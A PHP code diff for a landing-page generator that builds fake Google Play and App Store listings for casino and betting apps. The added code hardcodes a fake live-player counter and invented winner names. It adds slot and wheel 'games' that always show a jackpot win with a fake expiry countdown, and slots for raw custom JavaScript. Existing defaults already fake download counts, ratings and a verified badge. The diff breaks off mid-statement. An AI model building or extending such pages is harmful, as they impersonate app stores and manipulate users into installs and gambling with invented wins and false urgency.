@@ -34,7 +34,7 @@ class PwaLanding
      * page; the lander route regenerates stale statics on the next view, so
      * renderer upgrades reach already-created PWA landings without a re-save.
      */
-    public const RENDERER_VERSION = 8;
+    public const RENDERER_VERSION = 10;
 
     /** Keys the constructor is allowed to persist; everything else is dropped. */
     private static function configKeys(): array
@@ -47,53 +47,71 @@ class PwaLanding
             'support_email', 'support_address', 'verified_badge', 'theme_mode',
             'color_scheme', 'store_style', 'ios_flow', 'preloader', 'bottom_menu', 'show_header',
             'show_share', 'auto_redirect', 'decline_redirect', 'install_redirect', 'push_enabled',
-            'app_action', 'app_screen_title', 'app_screen_text', 'app_screen_button', 'app_screen_image',
+            'app_action', 'app_screen_type', 'app_screen_title', 'app_screen_text', 'app_screen_button',
+            'app_screen_image', 'app_screen_custom_html', 'app_screen_custom_js',
+            'custom_css', 'custom_head_code', 'custom_body_code', 'custom_js',
+            'animation_glow', 'show_live_badge', 'sound_enabled', 'vibration_enabled',
+            'action_target', 'action_campaign_id', 'action_url',
         ];
     }
 
     public static function defaultConfig(): array
     {
         return [
-            'pwa'               => true,
-            'app_name'          => '',
-            'developer'         => '',
-            'category'          => 'Casino',
-            'lang'              => 'en',
-            'icon'              => '',
-            'icon_url'          => '',
-            'screens'           => [],
-            'description'       => '',
-            'downloads'         => '1M+',
-            'ads_label'         => 'Contains ads',
-            'button_text'       => 'Install',
-            'version'           => '1.0.0',
-            'updated'           => '',
-            'tags'              => [],
-            'rating_counts'     => [4200, 480, 120, 30, 15],
-            'comments'          => [],
-            'whats_new_enabled' => false,
-            'whats_new_text'    => '',
-            'support_enabled'   => false,
-            'support_email'     => '',
-            'support_address'   => '',
-            'verified_badge'    => true,
-            'theme_mode'        => 'light',
-            'color_scheme'      => 'green',
-            'store_style'       => 'auto',
-            'push_enabled'      => false,
-            'ios_flow'          => 'default',
-            'preloader'         => true,
-            'bottom_menu'       => false,
-            'show_header'       => true,
-            'show_share'        => false,
-            'auto_redirect'     => 0,
-            'decline_redirect'  => 0,
-            'install_redirect'  => 0,
-            'app_action'        => 'store',
-            'app_screen_title'  => '',
-            'app_screen_text'   => '',
-            'app_screen_button' => 'Play now',
-            'app_screen_image'  => '',
+            'pwa'                    => true,
+            'app_name'               => '',
+            'developer'              => '',
+            'category'               => 'Casino',
+            'lang'                   => 'en',
+            'icon'                   => '',
+            'icon_url'               => '',
+            'screens'                => [],
+            'description'            => '',
+            'downloads'              => '1M+',
+            'ads_label'              => 'Contains ads',
+            'button_text'            => 'Install',
+            'version'                => '1.0.0',
+            'updated'                => '',
+            'tags'                   => [],
+            'rating_counts'          => [4200, 480, 120, 30, 15],
+            'comments'               => [],
+            'whats_new_enabled'      => false,
+            'whats_new_text'         => '',
+            'support_enabled'        => false,
+            'support_email'          => '',
+            'support_address'        => '',
+            'verified_badge'         => true,
+            'theme_mode'             => 'light',
+            'color_scheme'           => 'green',
+            'store_style'            => 'auto',
+            'push_enabled'           => false,
+            'ios_flow'               => 'default',
+            'preloader'              => true,
+            'bottom_menu'            => false,
+            'show_header'            => true,
+            'show_share'             => false,
+            'auto_redirect'          => 0,
+            'decline_redirect'       => 0,
+            'install_redirect'       => 0,
+            'animation_glow'         => true,
+            'show_live_badge'        => true,
+            'sound_enabled'          => true,
+            'vibration_enabled'      => true,
+            'app_action'             => 'store',
+            'app_screen_type'        => 'lobby',
+            'app_screen_title'       => '',
+            'app_screen_text'        => '',
+            'app_screen_button'      => 'Play now',
+            'app_screen_image'       => '',
+            'app_screen_custom_html' => '',
+            'app_screen_custom_js'   => '',
+            'custom_css'             => '',
+            'custom_head_code'       => '',
+            'custom_body_code'       => '',
+            'custom_js'              => '',
+            'action_target'          => 'to_offer',
+            'action_campaign_id'     => 0,
+            'action_url'             => '',
         ];
     }
 
@@ -173,6 +191,28 @@ class PwaLanding
         if (!in_array($c['app_action'], ['store', 'offer', 'screen'], true)) {
             $c['app_action'] = 'store';
         }
+        $c['app_screen_type'] = (string) ($c['app_screen_type'] ?? 'lobby');
+        if (!in_array($c['app_screen_type'], ['lobby', 'slot', 'wheel', 'custom'], true)) {
+            $c['app_screen_type'] = 'lobby';
+        }
+        $c['app_screen_custom_html'] = (string) ($c['app_screen_custom_html'] ?? '');
+        $c['app_screen_custom_js']   = (string) ($c['app_screen_custom_js'] ?? '');
+        $c['custom_css']             = (string) ($c['custom_css'] ?? '');
+        $c['custom_head_code']       = (string) ($c['custom_head_code'] ?? '');
+        $c['custom_body_code']       = (string) ($c['custom_body_code'] ?? '');
+        $c['custom_js']              = (string) ($c['custom_js'] ?? '');
+        $c['animation_glow']         = (bool) ($c['animation_glow'] ?? true);
+        $c['show_live_badge']        = (bool) ($c['show_live_badge'] ?? true);
+        $c['sound_enabled']          = (bool) ($c['sound_enabled'] ?? true);
+        $c['vibration_enabled']      = (bool) ($c['vibration_enabled'] ?? true);
+
+        $c['action_target'] = (string) ($c['action_target'] ?? 'to_offer');
+        if (!in_array($c['action_target'], ['to_offer', 'to_campaign', 'to_url', 'not_found'], true)) {
+            $c['action_target'] = 'to_offer';
+        }
+        $c['action_campaign_id'] = max(0, (int) ($c['action_campaign_id'] ?? 0));
+        $c['action_url'] = trim((string) ($c['action_url'] ?? ''));
+
         if (!in_array($c['ios_flow'], ['default', 'instruction'], true)) {
             $c['ios_flow'] = 'instruction';
         }
@@ -266,7 +306,7 @@ class PwaLanding
      * Unlike generate() this performs NO disk checks: icon/screens entries are
      * rendered as configured so the operator sees the draft, not the filter.
      */
-    public static function renderPreview(array $config, string $platform = 'auto'): string
+    public static function renderPreview(array $config, string $platform = 'auto', string $view = 'auto'): string
     {
         $c = self::normalizeConfig($config);
         if ($c === []) {
@@ -275,6 +315,7 @@ class PwaLanding
         $html = self::renderIndex($c, 0);
         $html = str_replace('{subid}', '', $html);
         $html = str_replace('{lp_url}', '#', $html);
+        $html = str_replace(['{clickid}', '{token}', '{offer}', '{sub_id}'], '#', $html);
         // No VAPID in preview: the subscribe screen stays hidden, the page is
         // about looks, not about collecting subscriptions from the operator.
         $html = str_replace('{vapid_public}', '', $html);
@@ -287,6 +328,14 @@ class PwaLanding
             $html = preg_replace(
                 '/<head[^>]*>/i',
                 "$0\n<script>window.__PWA_FORCE_IOS = true;</script>",
+                $html,
+                1
+            );
+        }
+        if ($view === 'screen' || ($view === 'auto' && ($c['app_action'] ?? '') === 'screen')) {
+            $html = preg_replace(
+                '/<head[^>]*>/i',
+                "$0\n<script>window.__PWA_FORCE_APP_SCREEN = true;</script>",
                 $html,
                 1
             );
@@ -533,11 +582,13 @@ SW;
         $t = $dict[$lang];
 
         $cfgForJs = [
-            'auto'    => (int) $c['auto_redirect'],
-            'decline' => (int) $c['decline_redirect'],
-            'install' => (int) $c['install_redirect'],
-            'push'    => !empty($c['push_enabled']),
-            'appAction' => $c['app_action'],
+            'auto'       => (int) $c['auto_redirect'],
+            'decline'    => (int) $c['decline_redirect'],
+            'install'    => (int) $c['install_redirect'],
+            'push'       => !empty($c['push_enabled']),
+            'appAction'  => $c['app_action'],
+            'sound'      => !empty($c['sound_enabled']),
+            'vibration'  => !empty($c['vibration_enabled']),
         ];
 
         $iconSrc = self::iconSrc($c);
@@ -573,6 +624,10 @@ SW;
             ? round($total / 1000000, 1) . 'M'
             : ($total >= 1000 ? round($total / 1000, 1) . 'K' : (string) $total);
 
+        $glowClass = $c['animation_glow'] ? ' btn-glow-active' : '';
+        $liveBadgeHtml = $c['show_live_badge'] ? '<span class="gp-live-counter">🟢 14.8K live</span>' : '';
+        $liveBadgeIos = $c['show_live_badge'] ? '<span class="ios-live-counter">🟢 14.8K live</span>' : '';
+
         // ------------------------------------------------------------------
         // GOOGLE PLAY LAYOUT
         // ------------------------------------------------------------------
@@ -588,9 +643,9 @@ SW;
             . '</h1>'
             . '<div class="dev">' . self::esc($c['developer']) . '</div>'
             . '<div class="sub">' . self::esc($c['ads_label']) . ' · ' . self::esc($c['category']) . '</div>'
-            . '<div class="sub rating-line">' . number_format($avg, 1, '.', '') . ' <span class="mini-stars">' . self::starsSvg($avg, 'var(--pwa-star)') . '</span> · ' . $totalFormatted . ' reviews · ' . self::esc($c['downloads']) . ' Downloads</div>'
+            . '<div class="sub rating-line">' . number_format($avg, 1, '.', '') . ' <span class="mini-stars">' . self::starsSvg($avg, 'var(--pwa-star)') . '</span> · ' . $totalFormatted . ' reviews · ' . self::esc($c['downloads']) . ' Downloads' . $liveBadgeHtml . '</div>'
             . '</div></div>'
-            . '<button type="button" id="pwa-install-btn" class="install-btn install-trigger">' . self::esc($c['button_text']) . '</button>'
+            . '<button type="button" id="pwa-install-btn" class="install-btn install-trigger' . $glowClass . '">' . self::esc($c['button_text']) . '</button>'
             . '<div id="pwa-installing" class="installing" hidden>' . self::esc($t[5]) . '</div>'
             . '</section>';
 
@@ -666,9 +721,9 @@ SW;
             . $iconHtml
             . '<div class="ios-hero-info">'
             . '<h1 class="ios-app-title">' . self::esc($appName) . '</h1>'
-            . '<div class="ios-app-subtitle">' . self::esc($c['category']) . ' · ' . self::esc($c['developer']) . '</div>'
+            . '<div class="ios-app-subtitle">' . self::esc($c['category']) . ' · ' . self::esc($c['developer']) . ' ' . $liveBadgeIos . '</div>'
             . '<div class="ios-action-row">'
-            . '<button type="button" id="pwa-install-btn-ios" class="ios-get-btn install-trigger">' . self::esc($t['get'] ?? 'GET') . '</button>'
+            . '<button type="button" id="pwa-install-btn-ios" class="ios-get-btn install-trigger' . $glowClass . '">' . self::esc($t['get'] ?? 'GET') . '</button>'
             . '<button type="button" class="ios-more-btn">···</button>'
             . '</div>'
             . '<div class="ios-in-app-text">' . self::esc($c['ads_label']) . '</div>'
@@ -773,88 +828,217 @@ SW;
             $appText = $c['app_screen_text'] !== '' ? $c['app_screen_text'] : '';
             $appBtn = $c['app_screen_button'] !== '' ? $c['app_screen_button'] : 'Play now';
 
-            $catLower = strtolower($c['category']);
-            if (strpos($catLower, 'sport') !== false || strpos($catLower, 'bet') !== false) {
-                $tilesHtml = '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">⚽</span><span class="appscr-tile-name">Live Match</span><span class="appscr-tile-badge">LIVE 78\'</span></div>'
-                    . '<div class="appscr-tile active install-trigger"><span class="appscr-tile-icon">🔥</span><span class="appscr-tile-name">Top Express</span><span class="appscr-tile-badge gold">+35% BOOST</span></div>'
-                    . '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🎯</span><span class="appscr-tile-name">Quick Bet</span><span class="appscr-tile-badge">1-CLICK</span></div>';
-                $balancePill = '<span class="appscr-coin-icon">🏆</span><span class="appscr-coin-val">FREE BET: $50</span>';
-                $tab2Name = 'Matches';
-                $tab2Icon = '⚽';
-            } elseif (strpos($catLower, 'fit') !== false) {
-                $tilesHtml = '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🔥</span><span class="appscr-tile-name">HIIT Burn</span><span class="appscr-tile-badge">25 MIN</span></div>'
-                    . '<div class="appscr-tile active install-trigger"><span class="appscr-tile-icon">💪</span><span class="appscr-tile-name">Daily Plan</span><span class="appscr-tile-badge gold">DAY 1</span></div>'
-                    . '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🥗</span><span class="appscr-tile-name">Diet Guide</span><span class="appscr-tile-badge">PRO</span></div>';
-                $balancePill = '<span class="appscr-coin-icon">🔥</span><span class="appscr-coin-val">DAY 1 ACTIVE</span>';
-                $tab2Name = 'Workouts';
-                $tab2Icon = '🏋️';
-            } else {
-                $tilesHtml = '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🎰</span><span class="appscr-tile-name">Mega 777</span><span class="appscr-tile-badge">JACKPOT</span></div>'
-                    . '<div class="appscr-tile active install-trigger"><span class="appscr-tile-icon">🎁</span><span class="appscr-tile-name">Daily Wheel</span><span class="appscr-tile-badge gold">FREE SPIN</span></div>'
-                    . '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">💎</span><span class="appscr-tile-name">VIP Royal</span><span class="appscr-tile-badge">HOT</span></div>';
-                $balancePill = '<span class="appscr-coin-icon">🪙</span><span class="appscr-coin-val">10,000 COINS</span>';
-                $tab2Name = 'Games';
-                $tab2Icon = '🎮';
-            }
-
             $iconInner = $iconSrc !== ''
                 ? '<img src="' . self::esc($iconSrc) . '" alt="">'
                 : '<span class="appscr-avatar-txt">' . self::esc(mb_substr($appName, 0, 1)) . '</span>';
 
-            $heroBg = $c['app_screen_image'] !== ''
-                ? '<div class="appscr-hero-wrap"><img class="appscr-hero-img" src="' . self::esc($c['app_screen_image']) . '" alt="" onerror="this.parentNode.style.display=\'none\'"><div class="appscr-hero-vignette"></div></div>'
-                : '<div class="appscr-hero-wrap appscr-hero-gradient"><div class="appscr-hero-vignette"></div></div>';
+            if ($c['app_screen_type'] === 'custom') {
+                $customHtml = $c['app_screen_custom_html'] !== ''
+                    ? $c['app_screen_custom_html']
+                    : '<div style="display:flex;min-height:100vh;align-items:center;justify-content:center;flex-direction:column;gap:16px;padding:24px;text-align:center;background:#0d1117;color:#fff;">'
+                    . '<h2>' . self::esc($appTitle) . '</h2>'
+                    . ($appText !== '' ? '<p style="color:rgba(255,255,255,0.7);max-width:400px;">' . nl2br(self::esc($appText)) . '</p>' : '')
+                    . '<button type="button" class="appscr-cta-btn install-trigger" style="max-width:280px;">' . self::esc($appBtn) . '</button>'
+                    . '</div>';
 
-            $appScreen = '<div id="pwa-app-screen" hidden>'
-                . '<div class="appscr-bg-canvas">'
-                . $heroBg
-                . '<div class="appscr-shell">'
-                . '<header class="appscr-header">'
-                . '<div class="appscr-user-badge">'
-                . '<div class="appscr-avatar">' . $iconInner . '</div>'
-                . '<div class="appscr-user-details">'
-                . '<div class="appscr-user-name">' . self::esc($appName) . '</div>'
-                . '<div class="appscr-user-sub">● VIP CLUB</div>'
-                . '</div>'
-                . '</div>'
-                . '<div class="appscr-header-right">'
-                . '<div class="appscr-balance-pill">' . $balancePill . '</div>'
-                . '<div class="appscr-bell">🔔</div>'
-                . '</div>'
-                . '</header>'
-                . '<div class="appscr-body">'
-                . '<div class="appscr-main-card">'
-                . '<div class="appscr-card-badges">'
-                . '<span class="appscr-badge-live">● LIVE BONUS</span>'
-                . '<span class="appscr-badge-rtp">⚡ INSTANT ACCESS</span>'
-                . '</div>'
-                . '<h1 class="appscr-headline">' . self::esc($appTitle) . '</h1>'
-                . ($appText !== '' ? '<p class="appscr-subtext">' . nl2br(self::esc($appText)) . '</p>' : '')
-                . '<div class="appscr-cta-wrap">'
-                . '<button type="button" id="pwa-app-cta" class="appscr-cta-btn install-trigger">'
-                . '<span class="appscr-cta-glow"></span>'
-                . '<span class="appscr-cta-lbl">' . self::esc($appBtn) . '</span>'
-                . '<span class="appscr-cta-arrow">➔</span>'
-                . '</button>'
-                . '<div class="appscr-trust-row">'
-                . '<span>🔒 256-Bit SSL</span><span>•</span><span>⚡ Instant Payouts</span><span>•</span><span>🎯 18+</span>'
-                . '</div>'
-                . '</div>'
-                . '</div>'
-                . '<div class="appscr-lobby-section">'
-                . '<div class="appscr-section-head"><span>POPULAR TODAY</span><span class="appscr-see-all">ALL &gt;</span></div>'
-                . '<div class="appscr-tiles-row">' . $tilesHtml . '</div>'
-                . '</div>'
-                . '</div>'
-                . '<nav class="appscr-tabbar">'
-                . '<div class="appscr-tab active"><span class="appscr-tab-icon">🏠</span><span>Lobby</span></div>'
-                . '<div class="appscr-tab"><span class="appscr-tab-icon">' . $tab2Icon . '</span><span>' . $tab2Name . '</span></div>'
-                . '<div class="appscr-tab"><span class="appscr-tab-icon">🎁</span><span>Bonuses</span></div>'
-                . '<div class="appscr-tab"><span class="appscr-tab-icon">👤</span><span>Account</span></div>'
-                . '</nav>'
-                . '</div>'
-                . '</div>'
-                . '</div>';
+                $customScriptTag = $c['app_screen_custom_js'] !== ''
+                    ? '<script>' . $c['app_screen_custom_js'] . '</script>'
+                    : '';
+
+                $appScreen = '<div id="pwa-app-screen" class="appscr-custom-mode" hidden>'
+                    . '<div class="appscr-custom-container">' . $customHtml . '</div>'
+                    . $customScriptTag
+                    . '</div>';
+            } elseif ($c['app_screen_type'] === 'slot') {
+                $appScreen = '<div id="pwa-app-screen" class="appscr-game-mode appscr-slot-mode" hidden>'
+                    . '<div class="appscr-shell slot-shell">'
+                    . '<header class="appscr-header">'
+                    . '<div class="appscr-user-badge">'
+                    . '<div class="appscr-avatar">' . $iconInner . '</div>'
+                    . '<div class="appscr-user-details">'
+                    . '<div class="appscr-user-name">' . self::esc($appName) . '</div>'
+                    . '<div class="appscr-user-sub">● VIP 777</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<div class="appscr-header-right">'
+                    . '<div class="appscr-balance-pill"><span class="appscr-coin-icon">🪙</span><span class="appscr-coin-val" id="pwa-slot-balance">5,000 COINS</span></div>'
+                    . '</div>'
+                    . '</header>'
+                    . '<div class="pwa-slot-cabinet">'
+                    . '<div class="pwa-jackpot-ribbon"><span class="jackpot-glow">⚡ MEGA JACKPOT ⚡</span><span class="jackpot-val" id="pwa-slot-jackpot">$250,000.00</span></div>'
+                    . '<div class="pwa-slot-window">'
+                    . '<div class="pwa-slot-payline"></div>'
+                    . '<div class="pwa-slot-reels">'
+                    . '<div class="pwa-reel" id="pwa-reel-0"><div class="pwa-reel-strip"><div class="pwa-sym">🍒</div><div class="pwa-sym">🔔</div><div class="pwa-sym">💎</div><div class="pwa-sym">7️⃣</div><div class="pwa-sym">👑</div><div class="pwa-sym">🍇</div><div class="pwa-sym">7️⃣</div><div class="pwa-sym">⭐</div></div></div>'
+                    . '<div class="pwa-reel" id="pwa-reel-1"><div class="pwa-reel-strip"><div class="pwa-sym">🔔</div><div class="pwa-sym">7️⃣</div><div class="pwa-sym">🍒</div><div class="pwa-sym">👑</div><div class="pwa-sym">💎</div><div class="pwa-sym">7️⃣</div><div class="pwa-sym">⭐</div><div class="pwa-sym">🍇</div></div></div>'
+                    . '<div class="pwa-reel" id="pwa-reel-2"><div class="pwa-reel-strip"><div class="pwa-sym">👑</div><div class="pwa-sym">💎</div><div class="pwa-sym">7️⃣</div><div class="pwa-sym">🍒</div><div class="pwa-sym">🔔</div><div class="pwa-sym">7️⃣</div><div class="pwa-sym">🍇</div><div class="pwa-sym">⭐</div></div></div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<div class="pwa-slot-controls">'
+                    . '<div class="pwa-slot-status" id="pwa-slot-msg">TAP SPIN TO WIN THE JACKPOT!</div>'
+                    . '<button type="button" id="pwa-slot-spin-btn" class="pwa-slot-spin-btn"><span class="spin-glow"></span><span class="spin-txt">🎰 SPIN NOW!</span></button>'
+                    . '<div class="pwa-slot-spins-left">🎁 1 FREE SPIN AVAILABLE</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<div id="pwa-slot-win-modal" class="pwa-modal-overlay" hidden>'
+                    . '<div class="pwa-modal-card">'
+                    . '<div class="pwa-modal-confetti">🎉</div>'
+                    . '<div class="pwa-modal-badge">🏆 BIG WINNER!</div>'
+                    . '<h2 class="pwa-modal-title">' . self::esc($appTitle !== '' ? $appTitle : 'JACKPOT WON: $1,500!') . '</h2>'
+                    . '<p class="pwa-modal-text">' . self::esc($appText !== '' ? $appText : 'Congratulations! Your exclusive welcome bonus has been activated.') . '</p>'
+                    . '<div class="pwa-modal-timer">⚡ Offer expires in: <span class="pwa-countdown">04:59</span></div>'
+                    . '<button type="button" id="pwa-slot-claim" class="appscr-cta-btn install-trigger">'
+                    . '<span class="appscr-cta-lbl">' . self::esc($appBtn !== '' ? $appBtn : 'CLAIM BONUS & PLAY') . '</span>'
+                    . '<span class="appscr-cta-arrow">➔</span>'
+                    . '</button>'
+                    . '</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '</div>';
+            } elseif ($c['app_screen_type'] === 'wheel') {
+                $appScreen = '<div id="pwa-app-screen" class="appscr-game-mode appscr-wheel-mode" hidden>'
+                    . '<div class="appscr-shell wheel-shell">'
+                    . '<header class="appscr-header">'
+                    . '<div class="appscr-user-badge">'
+                    . '<div class="appscr-avatar">' . $iconInner . '</div>'
+                    . '<div class="appscr-user-details">'
+                    . '<div class="appscr-user-name">' . self::esc($appName) . '</div>'
+                    . '<div class="appscr-user-sub">● VIP CLUB</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<div class="appscr-header-right">'
+                    . '<div class="appscr-balance-pill"><span class="appscr-coin-icon">💎</span><span class="appscr-coin-val">VIP BONUS</span></div>'
+                    . '</div>'
+                    . '</header>'
+                    . '<div class="pwa-wheel-stage">'
+                    . '<div class="pwa-wheel-headline">' . self::esc($appTitle !== '' ? $appTitle : 'LUCKY BONUS WHEEL') . '</div>'
+                    . '<div class="pwa-wheel-subhead">' . self::esc($appText !== '' ? $appText : 'Spin the wheel to unlock your exclusive welcome bonus!') . '</div>'
+                    . '<div class="pwa-wheel-container">'
+                    . '<div class="pwa-wheel-pointer">▼</div>'
+                    . '<svg id="pwa-wheel-disc" class="pwa-wheel-disc" viewBox="0 0 360 360">'
+                    . '<g transform="translate(180,180)">'
+                    . '<path d="M0,0 L0,-170 A170,170 0 0,1 120.2,-120.2 Z" fill="#e74c3c"/>'
+                    . '<text transform="rotate(22.5) translate(0,-115) rotate(-22.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">$500</text>'
+                    . '<path d="M0,0 L120.2,-120.2 A170,170 0 0,1 170,0 Z" fill="#f39c12"/>'
+                    . '<text transform="rotate(67.5) translate(0,-115) rotate(-67.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">100 FS</text>'
+                    . '<path d="M0,0 L170,0 A170,170 0 0,1 120.2,120.2 Z" fill="#8e44ad"/>'
+                    . '<text transform="rotate(112.5) translate(0,-115) rotate(-112.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">200%</text>'
+                    . '<path d="M0,0 L120.2,120.2 A170,170 0 0,1 0,170 Z" fill="#27ae60"/>'
+                    . '<text transform="rotate(157.5) translate(0,-115) rotate(-157.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">50 FS</text>'
+                    . '<path d="M0,0 L0,170 A170,170 0 0,1 -120.2,120.2 Z" fill="#e67e22"/>'
+                    . '<text transform="rotate(202.5) translate(0,-115) rotate(-202.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">$100</text>'
+                    . '<path d="M0,0 L-120.2,120.2 A170,170 0 0,1 -170,0 Z" fill="#2980b9"/>'
+                    . '<text transform="rotate(247.5) translate(0,-115) rotate(-247.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">VIP</text>'
+                    . '<path d="M0,0 L-170,0 A170,170 0 0,1 -120.2,-120.2 Z" fill="#16a085"/>'
+                    . '<text transform="rotate(292.5) translate(0,-115) rotate(-292.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">250 FS</text>'
+                    . '<path d="M0,0 L-120.2,-120.2 A170,170 0 0,1 0,-170 Z" fill="#d35400"/>'
+                    . '<text transform="rotate(337.5) translate(0,-115) rotate(-337.5)" fill="#fff" font-size="13" font-weight="bold" text-anchor="middle">JACKPOT</text>'
+                    . '<circle r="36" fill="#1e272e" stroke="#ffd700" stroke-width="4"/>'
+                    . '</g>'
+                    . '</svg>'
+                    . '<button type="button" id="pwa-wheel-spin-btn" class="pwa-wheel-spin-btn">SPIN</button>'
+                    . '</div>'
+                    . '<div class="pwa-wheel-spins-hint">⚡ 1 FREE SPIN REMAINING</div>'
+                    . '</div>'
+                    . '<div id="pwa-wheel-win-modal" class="pwa-modal-overlay" hidden>'
+                    . '<div class="pwa-modal-card">'
+                    . '<div class="pwa-modal-confetti">🎁</div>'
+                    . '<div class="pwa-modal-badge">🎉 WINNER!</div>'
+                    . '<h2 class="pwa-modal-title">JACKPOT + 250 FREE SPINS!</h2>'
+                    . '<p class="pwa-modal-text">Your prize has been reserved! Claim it now before it expires.</p>'
+                    . '<div class="pwa-modal-timer">⚡ Reservation expires in: <span class="pwa-countdown">04:59</span></div>'
+                    . '<button type="button" id="pwa-wheel-claim" class="appscr-cta-btn install-trigger">'
+                    . '<span class="appscr-cta-lbl">' . self::esc($appBtn !== '' ? $appBtn : 'CLAIM BONUS & PLAY') . '</span>'
+                    . '<span class="appscr-cta-arrow">➔</span>'
+                    . '</button>'
+                    . '</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '</div>';
+            } else {
+                // Native Lobby / Dashboard
+                $catLower = strtolower($c['category']);
+                if (strpos($catLower, 'sport') !== false || strpos($catLower, 'bet') !== false) {
+                    $tilesHtml = '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">⚽</span><span class="appscr-tile-name">Live Match</span><span class="appscr-tile-badge">LIVE 78\'</span></div>'
+                        . '<div class="appscr-tile active install-trigger"><span class="appscr-tile-icon">🔥</span><span class="appscr-tile-name">Top Express</span><span class="appscr-tile-badge gold">+35% BOOST</span></div>'
+                        . '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🎯</span><span class="appscr-tile-name">Quick Bet</span><span class="appscr-tile-badge">1-CLICK</span></div>';
+                    $balancePill = '<span class="appscr-coin-icon">🏆</span><span class="appscr-coin-val">FREE BET: $50</span>';
+                    $tab2Name = 'Matches';
+                    $tab2Icon = '⚽';
+                } elseif (strpos($catLower, 'fit') !== false) {
+                    $tilesHtml = '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🔥</span><span class="appscr-tile-name">HIIT Burn</span><span class="appscr-tile-badge">25 MIN</span></div>'
+                        . '<div class="appscr-tile active install-trigger"><span class="appscr-tile-icon">💪</span><span class="appscr-tile-name">Daily Plan</span><span class="appscr-tile-badge gold">DAY 1</span></div>'
+                        . '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🥗</span><span class="appscr-tile-name">Diet Guide</span><span class="appscr-tile-badge">PRO</span></div>';
+                    $balancePill = '<span class="appscr-coin-icon">🔥</span><span class="appscr-coin-val">DAY 1 ACTIVE</span>';
+                    $tab2Name = 'Workouts';
+                    $tab2Icon = '🏋️';
+                } else {
+                    $tilesHtml = '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">🎰</span><span class="appscr-tile-name">Mega 777</span><span class="appscr-tile-badge">JACKPOT</span></div>'
+                        . '<div class="appscr-tile active install-trigger"><span class="appscr-tile-icon">🎁</span><span class="appscr-tile-name">Daily Wheel</span><span class="appscr-tile-badge gold">FREE SPIN</span></div>'
+                        . '<div class="appscr-tile install-trigger"><span class="appscr-tile-icon">💎</span><span class="appscr-tile-name">VIP Royal</span><span class="appscr-tile-badge">HOT</span></div>';
+                    $balancePill = '<span class="appscr-coin-icon">🪙</span><span class="appscr-coin-val">10,000 COINS</span>';
+                    $tab2Name = 'Games';
+                    $tab2Icon = '🎮';
+                }
+
+                $heroBg = $c['app_screen_image'] !== ''
+                    ? '<div class="appscr-hero-wrap"><img class="appscr-hero-img" src="' . self::esc($c['app_screen_image']) . '" alt="" onerror="this.parentNode.style.display=\'none\'"><div class="appscr-hero-vignette"></div></div>'
+                    : '<div class="appscr-hero-wrap appscr-hero-gradient"><div class="appscr-hero-vignette"></div></div>';
+
+                $appScreen = '<div id="pwa-app-screen" hidden>'
+                    . '<div class="appscr-bg-canvas">'
+                    . $heroBg
+                    . '<div class="appscr-shell">'
+                    . '<header class="appscr-header">'
+                    . '<div class="appscr-user-badge">'
+                    . '<div class="appscr-avatar">' . $iconInner . '</div>'
+                    . '<div class="appscr-user-details">'
+                    . '<div class="appscr-user-name">' . self::esc($appName) . '</div>'
+                    . '<div class="appscr-user-sub">● VIP CLUB</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<div class="appscr-header-right">'
+                    . '<div class="appscr-balance-pill">' . $balancePill . '</div>'
+                    . '<div class="appscr-bell">🔔</div>'
+                    . '</div>'
+                    . '</header>'
+                    . '<div class="appscr-ticker-wrap">'
+                    . '<div class="appscr-ticker-content">🔥 <span>Alex M. won $4,200</span> • <span>Elena R. won 250 FS</span> • <span>David K. won $1,850</span> • <span>Sarah W. unlocked VIP</span></div>'
+                    . '</div>'
+                    . '<div class="appscr-body">'
+                    . '<div class="appscr-main-card">'
+                    . '<div class="appscr-card-badges">'
+                    . '<span class="appscr-badge-live">● LIVE BONUS</span>'
+                    . '<span class="appscr-badge-rtp">⚡ INSTANT ACCESS</span>'
+                    . '</div>'
+                    . '<h1 class="appscr-headline">' . self::esc($appTitle) . '</h1>'
+                    . ($appText !== '' ? '<p class="appscr-subtext">' . nl2br(self::esc($appText)) . '</p>' : '')
+                    . '<div class="appscr-cta-wrap">'
+                    . '<button type="button" id="pwa-app-cta" class="appscr-cta-btn install-trigger">'
+                    . '<span class="appscr-cta-glow"></span>'
+                    . '<span class="appscr-cta-lbl">' . self::esc($appBtn) . '</span>'
+                    . '<span class="appscr-cta-arrow">➔</span>'
+                    . '</button>'
+                    . '<div class="appscr-trust-row">'
+                    . '<span>🔒 256-Bit SSL</span><span>•</span><span>⚡ Instant Payouts</span><span>•</span><span>🎯 18+</span>'
+                    . '</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<div class="appscr-lobby-section">'
+                    . '<div class="appscr-section-head"><span>POPULAR TODAY</span><span class="appscr-see-all">ALL &gt;</span></div>'
+                    . '<div class="appscr-tiles-row">' . $tilesHtml . '</div>'
+                    . '</div>'
+                    . '</div>'
+                    . '<nav class="appscr-tabbar">'
+                    . '<div class="appscr-tab active"><span class="appscr-tab-icon">🏠</span><span>Lobby</span></div>'
+                    . '<div class="appscr-tab"><span class="appscr-tab-icon">' . $tab2Icon . '</span><span>' . $tab2Name . '</span></div>'
+                    . '<div class="appscr-tab"><span class="appscr-tab-icon">🎁</span><span>Bonuses</span></div>'
+                    . '<div class="appscr-tab"><span class="appscr-tab-icon">👤</span><span>Account</span></div>'
